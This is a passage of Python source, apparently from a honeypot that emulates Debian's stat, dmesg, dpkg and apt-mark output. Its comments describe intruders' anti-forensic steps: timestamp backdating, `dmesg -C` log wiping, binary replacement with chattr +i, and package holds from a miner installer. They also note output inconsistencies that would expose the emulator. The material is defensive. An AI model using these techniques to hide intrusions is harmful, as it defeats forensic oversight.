                # said ext2/ext3 while `stat -f /tmp` said tmpfs.
                if fmt is not None:
                    fsinfo = self._statfs_fields(f)
                    out.append(self._stat_fmt(fmt, fsinfo)
                               + ("" if fmt.endswith("\\n") else "\n"))
                    continue
                out.append(self._statfs(f))
                continue
            info = self._statinfo(f, path, node)
            if fmt is not None:
                out.append(self._stat_fmt(fmt, info)
                           + ("" if fmt.endswith("\\n") else "\n"))
            elif terse:
                out.append("%s %d %d %x %d %d %x %d %d %d %d %d %d %d 4096\n"
                           % (f, info["s"], info["b"], info["f"], info["u"],
                              info["g"], 2049, info["i"], info["h"], 0, 0,
                              int(info["X"]), int(info["Y"]), int(info["W"])))
            else:
                ta, tm = (self._stat_time(node.atime),
                          self._stat_time(node.mtime))
                tc, tb = (self._stat_time(node.ctime),
                          self._stat_time(node.btime))
                extra = ""
                if node.chardev is not None:
                    extra = ("Device: 0,5\tInode: %-11d Links: %d"
                             " Device type: %x,%x\n"
                             % (info["i"], info["h"], node.chardev[0],
                                node.chardev[1]))
                else:
                    extra = ("Device: 801h/2049d\tInode: %-11d Links: %d\n"
                             % (info["i"], info["h"]))
                out.append(
                    "  File: %s\n  Size: %-14d Blocks: %-10d IO Block: 4096   %s\n"
                    "%s"
                    "Access: (%04o/%s)  Uid: (%5d/%8s)   Gid: (%5d/%8s)\n"
                    "Access: %s\nModify: %s\nChange: %s\n Birth: %s\n"
                    % (info["N"], info["s"], info["b"], info["F"], extra,
                       node.mode & 0o7777, info["A"], info["u"],
                       self._uname_of(node.uid), info["g"],
                       self._gname_of(node.gid),
                       ta, tm, tc, tb))
        return "".join(out), rc

    def _statinfo(self, label, path, node):
        size = self._node_size(node, path)
        if node.is_dir:
            kind = "directory"
        elif node.link is not None:
            kind = "symbolic link"
        elif node.chardev is not None:
            kind = "character special file"
        elif node.blockdev is not None:
            kind = "block special file"
        elif node.sock:
            kind = "socket"
        elif getattr(node, "fifo", False):
            kind = "fifo"
        else:
            kind = "regular empty file" if size == 0 else "regular file"
        name = label
        if node.link is not None:
            name = "%s -> %s" % (label, node.link)
        return {
            "n": label, "N": "'%s'" % name if False else name,
            # %s is the apparent size and %b is 512-byte blocks actually
            # allocated. Both came off the apparent size, so a 2 GiB sparse
            # file reported four million blocks where the guest reports 0.
            "s": size, "b": self._alloc_kb(node_alloc(node, path)) * 2,
            "i": self.fs.ino_of(node), "h": self.fs.nlink(path),
            "u": node.uid, "U": self._uname_of(node.uid),
            "g": node.gid, "G": self._gname_of(node.gid),
            "a": "%o" % (node.mode & 0o7777),
            "A": node.type_char + self._perms(node.mode),
            "f": "%x" % node_mode(node),
            # The human-readable timestamp specifiers were missing entirely,
            # so `stat -c %y` printed "?" for every file while plain `stat`
            # printed the same four timestamps happily -- two answers to one
            # question. %W was 0 while `stat` reported a Birth time, which no
            # filesystem does.
            # Four clocks, four answers. They were one number four times,
            # so `touch -t 202001010000 f` reported a change time in 2020 --
            # the kernel maintains ctime and nothing in userspace can set
            # it, which is exactly why an intruder checks it.
            "F": kind, "X": node.atime, "Y": node.mtime, "Z": node.ctime,
            "W": int(node.btime),
            "x": self._stat_time(node.atime), "y": self._stat_time(node.mtime),
            "z": self._stat_time(node.ctime), "w": self._stat_time(node.btime),
            "d": 2049, "D": "801", "B": 512, "o": 4096,
            "t": "%x" % (node.chardev[0] if node.chardev else 0),
            "T": "%x" % (node.chardev[1] if node.chardev else 0),
        }

    @staticmethod
    def _stat_time(ts):
        return (time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(ts))
                + ".%09d +0000" % int((ts % 1) * 1e9))

    def _stat_fmt(self, fmt, info):
        out, i = [], 0
        while i < len(fmt):
            c = fmt[i]
            if c == "%" and i + 1 < len(fmt):
                k = fmt[i + 1]
                if k == "%":
                    out.append("%")
                elif k in info:
                    v = info[k]
                    if k in ("X", "Y", "Z", "W"):
                        v = int(v)
                    out.append(str(v))
                else:
                    out.append("?")
                i += 2
                continue
            if c == "\\" and i + 1 < len(fmt):
                out.append({"n": "\n", "t": "\t", "\\": "\\"}.get(fmt[i + 1],
                                                                  fmt[i + 1]))
                i += 2
                continue
            out.append(c)
            i += 1
        return "".join(out)

    # What `stat -f` calls each filesystem, which is not what /proc/mounts
    # calls it.
    _STATFS_TYPE = {"ext4": "ext2/ext3", "tmpfs": "tmpfs",
                    "devtmpfs": "tmpfs", "vfat": "msdos",
                    "proc": "proc", "sysfs": "sysfs", "cgroup2": "cgroup2fs",
                    "devpts": "devpts", "securityfs": "securityfs",
                    "bpf": "bpf_fs", "debugfs": "debugfs",
                    "tracefs": "tracefs", "mqueue": "mqueue",
                    "hugetlbfs": "hugetlbfs", "pstore": "pstore",
                    "configfs": "configfs", "fusectl": "fusectl",
                    "binfmt_misc": "binfmt_misc"}

    def _statfs_fields(self, label):
        """statfs for the filesystem holding `label`, as stat's -c letters.

        It answered for the root filesystem whatever you asked about, so
        `stat -f /tmp` said ext2/ext3 with the root's block counts while
        `df /tmp` and `findmnt /tmp` said tmpfs -- three commands, one
        statfs call, two answers."""
        path = VFS.norm(label, self.cwd)
        row = self._mount_for(path) or {}
        mnt = row.get("TARGET", "/")
        fstype = self._STATFS_TYPE.get(row.get("FSTYPE", "ext4"),
                                       row.get("FSTYPE", "ext2/ext3"))
        if mnt == "/":
            total, _used, free, avail = self._root_space()
            inodes, iused = self.ROOT_INODES, self._inodes_used()
        else:
            total, used, _av = self._FS_SIZES.get(mnt, (1024, 0, 1024))
            if mnt == "/tmp":
                used += self._written_kb("/tmp")
            free = avail = max(0, total - used)
            inodes = 254389 if row.get("FSTYPE") == "tmpfs" else 0
            iused = 1
        return {
            "n": label,
            "i": root_fsid(mnt),
            "l": "255", "T": fstype,
            "t": {"ext2/ext3": "ef53", "tmpfs": "1021994",
                  "msdos": "4d44"}.get(fstype, "ef53"),
            "S": "4096", "s": "4096",
            "b": str(total // 4), "f": str(max(0, free) // 4),
            "a": str(max(0, avail) // 4),
            "c": str(inodes), "d": str(max(0, inodes - iused)),
        }

    def _statfs(self, label):
        """The block `stat -f` prints without a format."""
        i = self._statfs_fields(label)
        return ("  File: \"%s\"\n    ID: %s Namelen: %s     "
                "Type: %s\nBlock size: %s       "
                "Fundamental block size: %s\n"
                "Blocks: Total: %-10s Free: %-10s Available: %s\n"
                "Inodes: Total: %-10s Free: %s\n"
                % (i["n"], i["i"], i["l"], i["T"], i["S"], i["s"],
                   i["b"], i["f"], i["a"], i["c"], i["d"]))

    _KMSG_LEVELS = ("emerg", "alert", "crit", "err", "warn", "notice",
                    "info", "debug")

    def _kmsg_live(self, cleared=True):
        """The ring buffer as it stands: the boot, everything since, and
        anything this session made the kernel say.

        `cleared` applies the watermark a `dmesg -C` left. The journal does
        not pass it: journald has its own copy of every kernel message, and
        clearing the ring buffer does not reach into it -- which is the
        trap in a log wipe that stops at `dmesg -C`.
        """
        up = time.time() - BOOT_TS
        recs = [r for r in kmsg_records() if r[0] <= up]
        recs += list(getattr(self.fs, "dmesg_extra", ()))
        floor = getattr(self.fs, "kmsg_cleared", None)
        if cleared and floor is not None:
            recs = [r for r in recs if r[0] > floor]
        return sorted(recs, key=lambda r: r[0])

    def cmd_dmesg(self, a, stdin=""):
        """The kernel ring buffer.

        It was eight hand-written lines with no flags at all: -T, -x, -H,
        -t and --level were accepted and ignored, so `dmesg -T` printed
        seconds-since-boot where every real one prints a date, and
        `dmesg --level=err` printed the whole buffer. Rendered from the
        records now, in the formats measured off util-linux 2.41.
        """
        want_levels, human, ctime, notime, decode = None, False, False, \
            False, False
        clear, read_clear, facilities = False, False, None
        i = 0
        while i < len(a):
            x = a[i]
            if x in ("-T", "--ctime"):
                ctime = True
            elif x in ("-H", "--human"):
                human = True
            elif x in ("-t", "--notime"):
                notime = True
            elif x in ("-x", "--decode"):
                decode = True
            elif x in ("-k", "--kernel"):
                facilities = {"kern"}
            elif x in ("-u", "--userspace"):
                facilities = {"daemon", "syslog", "user", "auth"}
            elif x in ("-C", "--clear"):
                clear = True
            elif x in ("-c", "--read-clear"):
                read_clear = True
            elif x in ("-l", "--facility") and i + 1 < len(a):
                facilities = set(a[i + 1].split(","))
                i += 1
            elif x.startswith("--facility="):
                facilities = set(x.split("=", 1)[1].split(","))
            elif x in ("--level",) and i + 1 < len(a):
                want_levels = set(a[i + 1].split(","))
                i += 1
            elif x.startswith("--level="):
                want_levels = set(x.split("=", 1)[1].split(","))
            elif x in ("-n", "--console-level") and i + 1 < len(a):
                i += 1                        # sets console loglevel, prints
                return "", 0                  # nothing
            elif x in ("-w", "--follow", "-W", "--follow-new", "-P",
                       "--nopager", "-d", "--show-delta", "-e", "-r",
                       "--raw", "-S", "--syslog", "--noescape",
                       "--color=never", "--color=auto"):
                pass
            elif x.startswith("-") and x != "-":
                self.err("dmesg: unknown option -- '%s'" % x.lstrip("-"))
                self.err("Try 'dmesg --help' for more information.")
                return "", 1
            i += 1
        if want_levels:
            bad = [x for x in want_levels if x not in self._KMSG_LEVELS]
            if bad:
                self.err("dmesg: unknown level '%s'" % bad[0])
                return "", 1
        # kernel.dmesg_restrict is 0 on this box, so an unprivileged read is
        # allowed -- but if an attacker sets it, the next non-root read has
        # to start failing, or the sysctl is decoration.
        restrict = (self.fs.read("/proc/sys/kernel/dmesg_restrict")
                    or b"0").decode().strip()
        if restrict not in ("", "0") and self.uid != 0:
            self.err("dmesg: read kernel buffer failed: Operation not "
                     "permitted")
            return "", 1
        if (clear or read_clear) and self.uid != 0:
            self.err("dmesg: clear kernel buffer failed: Operation not "
                     "permitted")
            return "", 1

        recs = self._kmsg_live()
        if facilities is not None:
            recs = [r for r in recs if r[1] in facilities]
        if want_levels:
            recs = [r for r in recs if r[2] in want_levels]
        out, prev, minute = [], None, None
        for off, fac, lvl, text in recs:
            when = BOOT_TS + off
            if notime:
                stamp = ""
            elif ctime:
                stamp = "[%s] " % time.strftime("%a %b %e %H:%M:%S %Y",
                                                time.localtime(when))
            elif human:
                mark = time.strftime("%b%d %H:%M", time.localtime(when))
                if mark != minute:
                    # A new minute prints its own header; everything under
                    # it prints the gap since the line before.
                    minute, prev = mark, off
                    stamp = "[%s] " % mark
                else:
                    # Right-aligned in the same 11 columns the header
                    # stamp occupies: "[  +0.000283]", "[ +13.290991]".
                    stamp = "[%11s] " % ("+%f" % (off - (prev if prev
                                                         is not None
                                                         else off)))
                    prev = off
            else:
                stamp = "[%12.6f] " % off
            head = ("%-6s:%-6s: " % (fac, lvl)) if decode else ""
            out.append(head + stamp + text + "\n")
        if clear:
            out = []
        if clear or read_clear:
            # The buffer is gone, but the journal and the log files keep
            # their copies -- which is what makes this worth trying and
            # worth catching.
            self.fs.kmsg_cleared = (time.time() - BOOT_TS)
            self.fs.dmesg_extra = []
        return "".join(out), 0

    _PKG_DESC = {
        "ca-certificates": "Common CA certificates",
        "tzdata": "time zone and daylight-saving time data",
        "man-db": "tools for reading manual pages",
        "locales": "GNU C Library: National Language (locale) data "
                   "[support]",
        # These three fell through to "Debian <name> package", the generic
        # fallback, while the packages beside them in `dpkg -l` carried real
        # descriptions.
        "openssl": "Secure Sockets Layer toolkit - cryptographic utility",
        "libssl3t64": "Secure Sockets Layer toolkit - shared libraries",
        "lsb-release": "Linux Standard Base version reporting utility "
                       "(minimal implementation)",
        "netbase": "Basic TCP/IP networking system",

        # Read off the guest, like the rest of this table.

        "dbus-daemon": "simple interprocess messaging system (reference message bus)",

        "udev": "/dev/ and hotplug management daemon",
        "bash": "GNU Bourne Again SHell",
        "coreutils": "GNU core utilities",
        "curl": "command line tool for transferring data with URL syntax",
        "wget": "retrieves files from the web",
        "nginx": "small, powerful, scalable web/proxy server",
        "systemd": "system and service manager",
        "openssh-server": "secure shell (SSH) server, for secure access from"
                          " remote machines",
        "openssh-client": "secure shell (SSH) client, for secure access to"
                          " remote machines",
        "libc6": "GNU C Library: Shared libraries",
        "mariadb-server": "MariaDB database server binaries",
        "python3": "interactive high-level object-oriented language",
        "apt": "commandline package manager",
        "dpkg": "Debian package management system",
        "perl-base": "minimal Perl system",
        "tar": "GNU version of the tar archiving utility",
        "util-linux": "miscellaneous system utilities",
        "util-linux-extra": "interactive utilities from util-linux",
        "procps": "/proc file system utilities",
        "libcap2-bin": "POSIX 1003.1e capabilities (utilities)",
        "psmisc": "utilities that use the proc file system",
    }

    def _PKG_DATA_FILES(self, name):
        """Non-binary files a package owns, for `dpkg -L`."""
        if name == "ca-certificates":
            out = ["/etc", "/etc/ssl", "/etc/ssl/certs",
                   "/etc/ssl/certs/ca-certificates.crt",
                   "/etc/ca-certificates.conf",
                   "/usr/share/ca-certificates",
                   "/usr/share/ca-certificates/mozilla"]
            out += ["/usr/share/ca-certificates/mozilla/%s.crt" % n
                    for n in CA_CERTS]
            return out
        if name == "netbase":
            return ["/etc", "/etc/ethertypes", "/etc/protocols", "/etc/rpc",
                    "/etc/services"]
        if name == "libpam-modules":
            return (["/etc", "/etc/security"]
                    + ["/etc/security/" + n for n in sorted(PAM_SECURITY)]
                    + ["/etc/security/limits.d", "/etc/security/namespace.d",
                       "/etc/security/namespace.init"])
        if name == "cron":
            return (["/etc", "/etc/default", "/etc/default/cron",
                     "/etc/init.d", "/etc/init.d/cron",
                     "/etc/pam.d", "/etc/pam.d/cron", "/etc/supercat"]
                    + sorted(p for p in CRON_FILES
                             if p.startswith("/etc/supercat/")))
        if name == "libpam-runtime":
            return ["/etc", "/etc/pam.d", "/etc/pam.d/other"]
        if name == "openssl":
            return ["/etc", "/etc/ssl", "/etc/ssl/openssl.cnf",
                    "/usr/lib/ssl", "/usr/lib/ssl/certs",
                    "/usr/lib/ssl/misc", "/usr/lib/ssl/openssl.cnf",
                    "/usr/lib/ssl/private"]
        return []

    def cmd_dpkg(self, a, stdin=""):
        args = [x for x in a if not x.startswith("-")]
        flags = [x for x in a if x.startswith("-")]
        has = lambda *names: any(f in names for f in flags)

        if has("-l", "--list"):
            # dpkg -l takes any number of patterns. It read args[0] and
            # dropped the rest, so `dpkg -l iptables ca-certificates
            # mariadb-client` -- one call instead of three, which is how a
            # dropper checks what it has to work with -- answered about
            # iptables alone and said nothing about the other two.
            pats = args or [None]
            rows, rc = [], 0
            for n, v, arch in self._installed_packages():
                if any(p is None or self._glob_ok(p, n) for p in pats):
                    rows.append((n, v, arch))
            for pat in pats:
                if pat is not None and not any(self._glob_ok(pat, n)
                                               for n, _v, _a in self._installed_packages()):
                    # Named per pattern, on stderr, and the ones that did
                    # match are still listed.
                    self.err("dpkg-query: no packages found matching %s"
                             % pat)
                    rc = 1
            if not rows:
                return "", rc
            # dpkg's columns have minimum widths -- Name 14, Version 12 --
            # so `dpkg -l bash`, the commonest form there is, lines up with
            # `dpkg -l` on a full list. Computing the width from the content
            # alone made a single-package query print a table two columns
            # narrower than the same package inside a longer one, which is
            # the sort of thing that only ever looks wrong side by side.
            wn = max([len(r[0]) for r in rows] + [14])
            wv = max([len(r[1]) for r in rows] + [12])
            out = ["Desired=Unknown/Install/Remove/Purge/Hold\n"
                   "| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/"
                   "trig-aWait/Trig-pend\n"
                   "|/ Err?=(none)/Reinst-required (Status,Err: "
                   "uppercase=bad)\n"
                   "||/ %-*s %-*s %-12s %s\n" % (wn, "Name", wv, "Version",
                                                 "Architecture", "Description"),
                   # The description rule is 33 wide, measured on the guest
                   # for both a 7-character name and a 15-character one --
                   # it does not shrink to make room. Ours was 43.
                   "+++-" + "=" * wn + "-" + "=" * wv
                   + "-============-" + "=" * 33 + "\n"]
            for n, v, arch in rows:
                out.append("ii  %-*s %-*s %-12s %s\n"
                           % (wn, n, wv, v, arch,
                              self._pkg_desc(n)))
            return "".join(out), rc

        if has("-s", "--status"):
            out, rc = [], 0
            for name in args:
                ver = self._pkg_version(name)
                if ver is None:
                    self.err("dpkg-query: package '%s' is not installed and no "
                             "information is available" % name)
                    rc = 1
                    continue
                arch = next(a2 for n, _v, a2 in self._installed_packages() if n == name)
                files = self._pkg_file_list(name)
                out.append(
                    "Package: %s\nStatus: install ok installed\nPriority: "
                    "optional\nSection: %s\nInstalled-Size: %d\n"
                    "Maintainer: Debian QA Group <packages@qa.debian.org>\n"
                    "Architecture: %s\nVersion: %s\nDepends: libc6\n"
                    "Description: %s\n"
                    % (name, "utils", max(120, len(files) * 96), arch, ver,
                       self._PKG_DESC.get(name, self._BOOT_PKG_DESC.get(
                           name, "Debian %s package" % name))))
            return "".join(out), rc

        if has("-S", "--search"):
            out, rc = [], 0
            for term in args:
                base = os.path.basename(term)
                hit = None
                # An exact path wins outright. /etc/pam.d/sshd and
                # /usr/sbin/sshd share a basename, and matching on that
                # first made `dpkg -S /usr/sbin/sshd` answer with the PAM
                # file's path -- the right package against the wrong file.
                if term in self._PKG_PATHS:
                    hit = (self._PKG_PATHS[term], term)
                elif "/" not in term:
                    # A bare name is a search, and real dpkg prints every
                    # file that matches rather than the first: `dpkg -S sshd`
                    # lists /etc/pam.d/sshd *and* /usr/sbin/sshd. Stopping at
                    # the first match meant that seeding the PAM file
                    # silently displaced the binary from the answer -- the
                    # question "what owns sshd" started returning a config
                    # file instead of the daemon.
                    matches = [(pkg, path)
                               for path, pkg in self._PKG_PATHS.items()
                               if base == os.path.basename(path)]
                    owner = self._owner_of(base)
                    if owner is not None:
                        # Every directory it is in, not the first. `dpkg -S ip`
                        # on the guest prints /usr/bin/ip and /usr/sbin/ip
                        # both, because iproute2 ships both; stopping at the
                        # first hit printed one and hid the other.
                        found = False
                        for d in ("/usr/sbin/", "/usr/bin/", "/usr/lib/"):
                            if self.fs.exists(d + base):
                                matches.append((owner, d + base))
                                found = True
                                if base not in self._BIN_AND_SBIN:
                                    break
                        del found
                    if matches:
                        out.extend("%s: %s\n" % m for m in matches)
                        continue
                if hit:
                    out.append("%s: %s\n" % hit)
                    continue
                # The data files -L now lists have to be searchable too, or
                # the two halves of dpkg-query disagree about who owns
                # /etc/ssl/certs/ca-certificates.crt.
                # This list was two packages long, so a config file any
                # other package owns came back "no path found" -- dpkg -S
                # said nothing owns /etc/services on a box whose dpkg -L
                # netbase lists it.
                for pkg in ("ca-certificates", "openssl", "netbase", "cron",
                            "libpam-modules"):
                    if term in self._PKG_DATA_FILES(pkg):
                        hit = (pkg, term)
                        break
                if hit:
                    out.append("%s: %s\n" % hit)
                    continue
                owner = self._owner_of(base)
                # A path the caller spelled out has to name a file that could
                # plausibly be it. Falling back to the basename for any term
                # meant `dpkg -S /no/such/file` answered "file:
                # /usr/bin/file" -- a confident owner for a path that does
                # not exist, from a command whose whole job is to say what
                # owns a given file. Directories that are the /usr merge's
                # other spelling still resolve, which is why the check is on
                # the directory rather than on the term itself.
                # dpkg does NOT follow the merged-/usr symlinks. Its file
                # list records /usr/bin/ls, and `dpkg -S /bin/ls` on a real
                # trixie answers "no path found matching pattern /bin/ls"
                # with rc 1 -- measured, along with /bin/ps, /bin/netstat
                # and /sbin/ip. This resolved the other spelling and
                # answered confidently, which is the box being *more*
                # helpful than the tool it is imitating.
                #
                # That matters here specifically: `dpkg -S /bin/ps` is what
                # you run to find out what owns a binary an anti-forensics
                # script has replaced, and the real answer is the unhelpful
                # one. A path with a slash in it now has to be a literal
                # entry in the file list.
                # The spellings dpkg's list does not contain are exactly the
                # pre-merge ones: /bin, /sbin, /lib and /lib64 are symlinks
                # into /usr, and the file list records only the /usr side.
                # A /usr path still resolves; a nonexistent one still does
                # not.
                _UNLISTED = ("/bin", "/sbin", "/lib", "/lib64",
                             "/lib32", "/libx32")
                if "/" in term and (
                        os.path.dirname(term) in _UNLISTED
                        or (not self.fs.exists(term)
                            and term not in self._PKG_PATHS)):
                    owner = None
                if owner is None:
                    self.err("dpkg-query: no path found matching pattern %s"
                             % term)
                    rc = 1
                    continue
                # dpkg reports the real path, which on a merged-/usr system is
                # under /usr even when the caller said /bin.
                # Same lookup as -L, for the same reason: the two used to
                # carry independent copies of the same six-name guess.
                #
                # A spelled-out path that exists is answered with itself.
                # Resolving by basename instead meant `dpkg -S /usr/bin/lsmod`
                # replied "kmod: /usr/sbin/lsmod" -- the right package against
                # a path the caller did not ask about -- for every name kmod
                # and iproute2 ship in both directories.
                if "/" in term and self.fs.exists(term):
                    canon = term
                    if canon.startswith("/bin/") or canon.startswith("/sbin/"):
                        canon = "/usr" + canon
                    out.append("%s: %s\n" % (owner, canon))
                    continue
                order = (("/usr/bin/", "/usr/sbin/", "/usr/lib/")
                         if base in self._BIN_AND_SBIN or
                         base not in self._SBIN
                         else ("/usr/sbin/", "/usr/bin/", "/usr/lib/"))
                for d in order:
                    if self.fs.exists(d + base):
                        out.append("%s: %s%s\n" % (owner, d, base))
                        break
                else:
                    out.append("%s: /usr/bin/%s\n" % (owner, base))
            return "".join(out), rc

        if has("-L", "--listfiles"):
            out, rc = [], 0
            for name in args:
                if self._pkg_version(name) is None:
                    self.err("dpkg-query: package '%s' is not installed" % name)
                    rc = 1
                    continue
                paths = ["/.", "/usr", "/usr/share",
                         "/usr/share/doc", "/usr/share/doc/" + name,
                         "/usr/share/doc/%s/copyright" % name,
                         "/usr/share/doc/%s/changelog.gz" % name]
                if any(n == name and "-" in v
                       for n, v, _a in self._installed_packages()):
                    paths.append(
                        "/usr/share/doc/%s/changelog.Debian.gz" % name)
                # Where each binary actually is, looked up rather than
                # guessed. This was "sbin" for six hardcoded names and "bin"
                # for everything else, so dpkg -L put ifconfig, iptables,
                # groupadd, fdisk, blkid, adduser, logrotate, dmidecode,
                # depmod and arp in /usr/bin when all ten are in /usr/sbin.
                # Every one of the 91 installed packages listed at least one
                # file that was not there, which `dpkg -L pkg | xargs ls`
                # shows in one command.
                for b in self._pkg_file_list(name):
                    hits = self._pkg_bin_hits(b)
                    paths.extend(hits)
                    # ...and the directory each one sits in, which dpkg lists
                    # beside the files. Skipping this dropped the /usr/bin and
                    # /usr/sbin entries from -L while the .list file kept
                    # them, which pkgdbtest compares.
                    paths.extend(h.rsplit("/", 1)[0] for h in hits)
                # A few packages are mostly data, not binaries. dpkg -L
                # ca-certificates listed only its doc files on a box where
                # the package's entire point -- the contents of
                # /etc/ssl/certs -- had just been created.
                paths += self._PKG_DATA_FILES(name)
                out.append("".join(sorted(set(paths))[i] + "\n"
                                   for i in range(len(set(paths)))))
            return "".join(out), rc

        if has("--get-selections"):
            # Patterns filter, as dpkg's do. This ignored its arguments and
            # dumped all 104 packages, so `dpkg --get-selections procps`
            # answered with the whole box -- and a script reading the second
            # field got whichever package sorted first.
            pats = [x for x in a[1:] if not x.startswith("-")]
            rows = [(n, self._pkg_selection(n))
                    for n, _v, _a in self._installed_packages()]
            if pats:
                rows = [r for r in rows
                        if any(self._glob_ok(pt, r[0]) for pt in pats)]
                if not rows:
                    # stderr, and rc 0: measured on trixie.
                    self.err("dpkg: no packages found matching %s" % pats[0])
                    return "", 0
            return "".join(self._selection_line(n, st) for n, st in rows), 0
        if has("--set-selections"):
            # Reads "<package> <state>" from stdin. It fell through to the
            # "need an action option" branch and exited 2, so the twenty-odd
            # holds the SRBMiner installer set on 2026-08-25 -- one per tool
            # it had replaced -- every one of them errored, on a box where
            # the real dpkg would have recorded them and apt-mark showhold
            # would have listed them.
            for line in (stdin or "").splitlines():
                f = line.split()
                if len(f) != 2:
                    continue
                if f[1] in ("install", "hold", "deinstall", "purge"):
                    self._pkg_set_selection(f[0], f[1])
            return "", 0
        if has("--print-architecture"):
            return "amd64\n", 0
        if has("--print-foreign-architectures"):
            # None configured on this box; the answer is nothing and success,
            # not "need an action option".
            return "", 0
        if has("-W", "--show"):
            # The scripted way to read a version:
            #   dpkg-query -W -f='${Version}' nginx
            # It answered "dpkg: need an action option", so any script that
            # checks what is installed got an error instead of a version.
            fmt = None
            for x in a:
                if x.startswith("-f="):
                    fmt = x[3:]
                elif x.startswith("--showformat="):
                    fmt = x.split("=", 1)[1]
            for i, x in enumerate(a):
                if x in ("-f", "--showformat") and i + 1 < len(a):
                    fmt = a[i + 1]
            wanted = [x for x in args if not x.startswith("-")]
            rows = [(n, v, ar) for n, v, ar in self._installed_packages()
                    if not wanted or any(self._pkg_match(pat, n)
                                         for pat in wanted)]
            if wanted and not rows:
                self.err("dpkg-query: no packages found matching %s"
                         % wanted[0])
                return "", 1
            out = []
            for n, v, ar in rows:
                if fmt is None:
                    out.append("%s\t%s\n" % (n, v))
                    continue
                line = (fmt.replace("${Package}", n)
                           .replace("${Version}", v)
                           .replace("${Architecture}", ar)
                           .replace("${binary:Package}", n)
                           .replace("${source:Version}", v)
                           .replace("${Status}", "install ok installed")
                           .replace("\\n", "\n").replace("\\t", "\t"))
                out.append(line)
            return "".join(out), 0
        if has("-V", "--verify"):
            # dpkg -V verifies md5sums and nothing else: every column except
            # the third is always '?', which is why a chmod on a packaged file
            # reports clean here and a rewrite reports ??5??????. Measured on
            # the guest, including that the exit status stays 0 even when it
            # finds tampering -- so a script gating on `dpkg -V && ok` learns
            # nothing, and one reading stdout learns everything.
            #
            # This is the command a defender runs after the anti-forensics
            # sequence 203.0.113.33 ran here: seven packaged binaries
            # replaced, each chmod 111 and chattr +i. Every neighbouring
            # action worked -- -l, -S, -s, -L, --audit -- so the box would
            # say procps owns /usr/bin/ps, list the file and hand over its
            # md5, while the one action that joins those facts answered
            # "dpkg: need an action option".
            wanted = [x for x in args if not x.startswith("-")]
            if wanted:
                for w in wanted:
                    if self._pkg_version(w) is None:
                        self.err("dpkg: package '%s' is not installed" % w)
                        return "", 1
                chosen = wanted
            else:
                chosen = [n for n, _v, _a in self._installed_packages()]
            touched = getattr(self.fs, "pkg_touched", {})
            rows = set()
            for name in chosen:
                for b in self._pkg_file_list(name):
                    for path in self._pkg_bin_hits(b):
                        if not self.fs.exists(path):
                            rows.add((path, "missing"))
                        elif touched.get(path):
                            rows.add((path, "??5??????"))
            # "missing" is 7 characters and "??5??????" is 9; dpkg pads both
            # into a 12-wide field, so the paths line up under each other.
            return "".join("%-12s%s\n" % (flag, path)
                           for path, flag in sorted(rows)), 0
        if has("--audit", "-C"):
            return "", 0
        if has("-i", "--install", "-r", "--remove", "-P", "--purge"):
            target = args[0] if args else ""
            self.err("dpkg: error: cannot access archive '%s': No such file or "
                     "directory" % target)
            return "", 2
        self.err("dpkg: need an action option")
        self.err("")
        self.err("Type dpkg --help for help about installing and deinstalling "
                 "packages [*];")
        return "", 2

    @staticmethod
    def _pkg_match(pattern, name):
        """dpkg-query takes glob patterns, so `dpkg-query -W 'nginx*'` works."""
        import fnmatch
        return fnmatch.fnmatchcase(name, pattern) or name == pattern

    cmd_dpkg_query = cmd_dpkg

    def cmd_apt_mark(self, a, stdin=""):
        """`apt-mark showmanual` answered "missing operand". It lists the
        packages an admin asked for rather than pulled in as dependencies --
        a normal thing to run when working out what a box is for."""
        sub = next((x for x in a if not x.startswith("-")), "")
        if sub in ("showmanual", "showauto", "showhold", "showinstall"):
            if sub == "showhold":
                # Read the same table dpkg --get-selections writes. This
                # returned "" unconditionally, so a hold set one command
                # earlier was invisible here -- two commands, one question,
                # and the one an admin runs to find tampering said nothing.
                sel = self._pkg_selections()
                return "".join(n + "\n" for n, _v, _a
                               in self._installed_packages()
                               if sel.get(n) == "hold"), 0
            auto = {"libc6", "libssl3", "zlib1g", "libpcre2-8-0", "perl-base",
                    "libgcc-s1", "libstdc++6", "libcrypt1", "libtinfo6"}
            names = [n for n, _v, _a in self._installed_packages()
                     if (n in auto) == (sub == "showauto")]
            return "".join(n + "\n" for n in names), 0
        if sub in ("manual", "auto", "hold", "unhold"):
            # Measured on trixie: "coreutils set on hold." / "Canceled hold
            # on coreutils." on stdout with rc 0, and for a name that is not
            # a package, two E: lines on stderr with rc 100. All four of
            # these were a silent "" and rc 0, so a script checking whether
            # its hold took could not tell success from a typo.
            targets = [x for x in a if not x.startswith("-")][1:]
            known = {n for n, _v, _a in self._installed_packages()}
            out, bad = [], []
            for t in targets:
                if t not in known:
                    bad.append(t)
                    continue
                if sub == "hold":
                    self._pkg_set_selection(t, "hold")
                    out.append("%s set on hold.\n" % t)
                elif sub == "unhold":
                    if self._pkg_selection(t) == "hold":
                        self._pkg_set_selection(t, "install")
                    out.append("Canceled hold on %s.\n" % t)
            if bad:
                for t in bad:
                    self.err("E: Unable to locate package %s" % t)
                self.err("E: No packages found")
                return "".join(out), 100
            return "".join(out), 0
        self.err("apt-mark: missing operand")
        return "", 1

    #: Where dpkg keeps a selection: the first word of the package's
    #: Status line in /var/lib/dpkg/status. Measured on a trixie --
    #: "Status: install ok installed" becomes "Status: hold ok installed"
    #: after `dpkg --set-selections`.
    _DPKG_STATUS = "/var/lib/dpkg/status"

    def _pkg_selections(self):
        """dpkg's selection states, read out of /var/lib/dpkg/status.

        This was a dict on the VFS. It worked for the length of a session
        and vanished on a restart, while the attacker's *files* came back
        from the replay journal -- so a returning actor found the package
        they had pinned unpinned, with nothing on disk ever having said it
        was held. Keeping it where the real dpkg keeps it means the journal
        carries it for free and there is only one copy of the answer.
        """
        out = {}
        body = (self.fs.read(self._DPKG_STATUS) or b"").decode("latin-1")
        name = None
        for line in body.splitlines():
            if line.startswith("Package: "):
                name = line[9:].strip()
            elif line.startswith("Status: ") and name:
                out[name] = line[8:].split()[0] if line[8:].split() else "install"
        return out

    def _pkg_set_selection(self, name, state):
        """Rewrite one package's Status line, as dpkg does."""
        body = (self.fs.read(self._DPKG_STATUS) or b"").decode("latin-1")
        lines = body.split("\n")
        cur, hit = None, False
        for i, line in enumerate(lines):
            if line.startswith("Package: "):
                cur = line[9:].strip()
            elif line.startswith("Status: ") and cur == name:
                rest = line[8:].split()
                lines[i] = "Status: %s %s" % (
                    state, " ".join(rest[1:]) if len(rest) > 1
                    else "ok installed")
                hit = True
                break
        if hit:
            self.fs.write(self._DPKG_STATUS,
